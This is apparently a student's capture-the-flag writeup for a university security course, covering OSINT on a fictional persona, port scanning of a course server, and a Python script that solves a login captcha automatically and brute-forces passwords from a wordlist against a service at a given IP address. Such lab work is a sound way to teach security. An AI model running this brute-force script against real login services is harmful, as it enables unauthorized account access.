# Writeup 2 - OSINT

Name: *PUT YOUR NAME HERE*
Section: *PUT YOUR SECTION NUMBER HERE*

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: *PUT YOUR NAME HERE*

## Assignment Writeup

### Part 1 (45 pts)

1.    What is ejnorman84's real name?
Eric J. Norman
2.    Where does ejnorman84 work? What is the URL to their website?
Wattsamp Energy, http://wattsamp.net/index.html
3.    List all personal information (including social media accounts, contacts, etc) you can find about ejnorman84. For each, briefly detail how you discovered them.
EricNorman84 – twitter handle (I discovered this by just searching for his handle on twitter)
EricNorman84 – Instagram handle (I discovered this by just searching for his handle on Instagram)
4.    List any ( >= 1 ) IP addresses associated with the website. For each, detail the location of the server, any history in DNS, and how you discovered this information.
157.230.179.99 – IP address which is based from North Bergen, New Jersey, USA 07047
The DNS history is new. 
The website was saved on September 7th, which is also when the website was hosted. 
I found all this information in html scripts of the website
5.    List any hidden files or directories you found on this website.
Hidden file called assets in the parent directory, I also found links to UMD cyber security clubs website (cec.umd.edu and their twitter page (umdcsec))
6.    What ports are open on the website? What services are running behind these ports? How did you discover this?
22/tcp open ssh
25/tcp filtered smtp
80/tcp open http
1337/tcp open waste
I figured these out by using nmap website name and running the command on all ports
7.    Which operating system is running on the server that is hosting the website? How did you discover this?
Ubuntu, I used the website browserspy.dk/webserver.php
8.    BONUS: Did you find any other flags on your OSINT mission? Note: the standard flag format for bonus flags is *CMSC389R-{}. (Up to 9 pts!)


### Part 2 (75 pts)

*Please use this space to detail your approach and solutions for part 2. Don't forget to upload your completed source code to this /writeup directory as well!*


Located flag.text 
contents: Good! Here's your flag: CMSC389R-{!enough_nrg_4_a_str0ng_Pa$$wrd}

My approach to this program: 

From the code that was provided I knew we using a socket to send and recieve information. So my first step was to find out using nc what the program was asking for, and from that I learned we needed to solve the captcha. 

First thing in my head was to send back an answer for the captcha to prompt me to the username line, and then the password.

I figured out the username through the website, but for the password I needed to parse through the file and automate the process until I guessed for a password. 

Here is my code: 
import socket
import re
import time

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/Users/jshaik/Desktop/guru99.txt" # Point to wordlist file

def brute_force():

with open(wordlist) as fp:
for cnt, line in enumerate(fp):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
time.sleep(3)
data = s.recv(2048)     # Receives 1024 bytes from IP/Port


exp = re.search('~~~ CAPTCHA ~~~\\n([\d]+) ([-+*\/]) ([\d]+)', data.decode().strip())


if(exp.group(2) == '+'):
ans = int(exp.group(1)) + int(exp.group(3))
elif (exp.group(2) == '-'):
ans = int(exp.group(1)) - int(exp.group(3))
elif (exp.group(2) == '*'):
ans = int(exp.group(1)) * int(exp.group(3))
else:
ans = int(exp.group(1)) // int(exp.group(3))

answerToSend = str(ans)+"\n"

# send captcha answer
s.send(answerToSend.encode())
# send username
username = "ejnorman84\n"
s.send(username.encode())
password = line+"\n"
s.send(password.encode())

time.sleep(1)
status = s.recv(1044)

if "Fail".encode() in status:
print(status)
else:
print("Success" + password)
break

if __name__ == '__main__':
brute_force()
